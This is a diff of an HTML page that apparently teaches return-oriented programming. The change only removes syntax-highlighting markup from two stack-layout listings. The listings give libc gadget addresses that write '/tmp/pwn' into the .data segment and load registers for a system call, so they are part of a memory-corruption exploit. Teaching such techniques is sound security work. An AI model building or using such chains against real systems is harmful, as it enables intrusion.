@@ -199,34 +199,34 @@ bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
 
 
 <p>We need to setup our stack as follows using the <code>libc</code> base of <code>0xb7e97000</code>. </p>
-<div class="highlight"><pre><span class="o">&lt;</span>lower memory<span class="o">&gt;</span>
-<span class="kc">...</span>
-<span class="c1"># Load the target address in .data</span>
-    <span class="mh">0xb7fcc19d</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>pop ecx<span class="p">;</span> ret<span class="p">)</span>
-    <span class="mh">0x08049710</span> <span class="o">&lt;-</span> Target memory address <span class="kr">in</span> .data
-<span class="c1"># Load the first part of our string &quot;/tmp&quot; into edx</span>
-    <span class="mh">0xb7e98a9e</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>pop edx<span class="p">;</span> ret<span class="p">)</span>
-    <span class="s">&quot;/tmp&quot;</span> <span class="o">&lt;-</span> First part of our string <span class="o">/</span>tmp
-<span class="c1"># Perform to move from edx to the .data segment</span>
-    <span class="mh">0xb7f0b997</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>mov dword <span class="p">[</span>ecx<span class="p">],</span> edx<span class="p">;</span> ret<span class="p">)</span>
-<span class="c1"># Load the next target address in .data</span>
-    <span class="mh">0xb7fcc19d</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>pop ecx<span class="p">;</span> ret<span class="p">)</span>
-    <span class="mh">0x08049714</span> <span class="o">&lt;-</span> Target memory address <span class="kr">in</span> .data <span class="o">+</span> <span class="m">4</span> bytes
-<span class="c1"># Load the second part of our string &quot;/pwn&quot; into edx </span>
-    <span class="mh">0xb7e98a9e</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>pop edx<span class="p">;</span> ret<span class="p">)</span>
-    <span class="s">&quot;/pwn&quot;</span> <span class="o">&lt;-</span> Second part of our string <span class="o">/</span>pwn
-<span class="c1"># Perform the move to .data</span>
-    <span class="mh">0xb7f0b997</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>mov dword <span class="p">[</span>ecx<span class="p">],</span> edx<span class="p">;</span> ret<span class="p">)</span>
-<span class="c1"># Load the final target address in .data</span>
-    <span class="mh">0xb7fcc19d</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>pop ecx<span class="p">;</span> ret<span class="p">)</span>
-    <span class="mh">0x08049718</span> <span class="o">&lt;-</span> Target memory address <span class="kr">in</span> .data <span class="o">+</span> <span class="m">4</span> bytes
-<span class="c1"># Load the NULL into edx </span>
-    <span class="mh">0xb7e98a9e</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>pop edx<span class="p">;</span> ret<span class="p">)</span>
-    <span class="mh">0x00000000</span> <span class="o">&lt;-</span> <span class="kc">NULL</span> bytes
-<span class="c1"># Perform the move to .data</span>
-    <span class="mh">0xb7f0b997</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>mov dword <span class="p">[</span>ecx<span class="p">],</span> edx<span class="p">;</span> ret<span class="p">)</span>
-<span class="kc">...</span>
-<span class="o">&lt;</span>higher memory<span class="o">&gt;</span>
+<div class="highlight"><pre>&lt;lower memory&gt;
+...
+# Load the target address in .data
+    0xb7fcc19d &lt;- Return address (pop ecx; ret)
+    0x08049710 &lt;- Target memory address in .data
+# Load the first part of our string &quot;/tmp&quot; into edx
+    0xb7e98a9e &lt;- Return address (pop edx; ret)
+    &quot;/tmp&quot; &lt;- First part of our string /tmp
+# Perform to move from edx to the .data segment
+    0xb7f0b997 &lt;- Return address (mov dword [ecx], edx; ret)
+# Load the next target address in .data
+    0xb7fcc19d &lt;- Return address (pop ecx; ret)
+    0x08049714 &lt;- Target memory address in .data + 4 bytes
+# Load the second part of our string &quot;/pwn&quot; into edx 
+    0xb7e98a9e &lt;- Return address (pop edx; ret)
+    &quot;/pwn&quot; &lt;- Second part of our string /pwn
+# Perform the move to .data
+    0xb7f0b997 &lt;- Return address (mov dword [ecx], edx; ret)
+# Load the final target address in .data
+    0xb7fcc19d &lt;- Return address (pop ecx; ret)
+    0x08049718 &lt;- Target memory address in .data + 4 bytes
+# Load the NULL into edx 
+    0xb7e98a9e &lt;- Return address (pop edx; ret)
+    0x00000000 &lt;- NULL bytes
+# Perform the move to .data
+    0xb7f0b997 &lt;- Return address (mov dword [ecx], edx; ret)
+...
+&lt;higher memory&gt;
 </pre></div>
 
 
@@ -240,15 +240,15 @@ bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
 
 
 <p>Here we've found all three in a single gadget. Awesome! Let's add the following to our stack layout.</p>
-<div class="highlight"><pre><span class="o">&lt;</span>lower memory<span class="o">&gt;</span>
-<span class="kc">...</span>
-<span class="c1"># Load registers</span>
-    <span class="mh">0xb7f6fa81</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>pop edx<span class="p">;</span> pop ecx<span class="p">;</span> pop ebx<span class="p">;</span> ret<span class="p">)</span>
-    <span class="mh">0x08049718</span> <span class="o">&lt;-</span> Argument <span class="m">3</span> destined <span class="kr">for</span> edx <span class="o">-</span> address of <span class="kc">NULL</span>
-    <span class="mh">0x08049718</span> <span class="o">&lt;-</span> Argument <span class="m">2</span> destined <span class="kr">for</span> ecx <span class="o">-</span> address of <span class="kc">NULL</span>
-    <span class="mh">0x08049710</span> <span class="o">&lt;-</span> Argument <span class="m">1</span> destined <span class="kr">for</span> ebx <span class="o">-</span> address of <span class="s">&quot;/tmp/pwn&quot;</span>
-<span class="kc">...</span>
-<span class="o">&lt;</span>higher memory<span class="o">&gt;</span>
+<div class="highlight"><pre>&lt;lower memory&gt;
+...
+# Load registers
+    0xb7f6fa81 &lt;- Return address (pop edx; pop ecx; pop ebx; ret)
+    0x08049718 &lt;- Argument 3 destined for edx - address of NULL
+    0x08049718 &lt;- Argument 2 destined for ecx - address of NULL
+    0x08049710 &lt;- Argument 1 destined for ebx - address of &quot;/tmp/pwn&quot;
+...
+&lt;higher memory&gt;
 </pre></div>
 
 
